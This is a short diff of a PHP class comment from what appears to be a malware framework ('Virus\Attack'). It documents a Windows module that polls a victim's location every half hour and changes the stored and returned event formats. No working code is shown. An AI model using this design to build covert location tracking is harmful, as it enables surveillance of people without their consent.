@@ -7,16 +7,25 @@ use Kelvinho\Virus\Attack\AttackBase;
 /**
  * Class MonitorLocation. Monitors the location every time interval. Currently it is set to half an hour.
  *
- * Structure of an event:
+ * Structure of an event saved on disk:
  * events => {
  *   "{unix time}" => {
  *     "lat" => "{latitude}",
- *     "lon" => "{longitude}",
+ *     "lng" => "{longitude}",
  *     "acc" => "{accuracy}"
  *     "name" => "{name}"
  *   }
  * }
  * And saved events are just a single unix timestamp, and all information is stored in events
+ *
+ * Structure of an event returned by the virus:
+ * {
+ *   "location": {
+ *     "lat": {latitude},
+ *     "lng": {longitude}
+ *   },
+ *   "accuracy": {accuracy}
+ * }
  *
  * @package Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorLocation
  * @author Quang Ho <157239q@gmail.com>
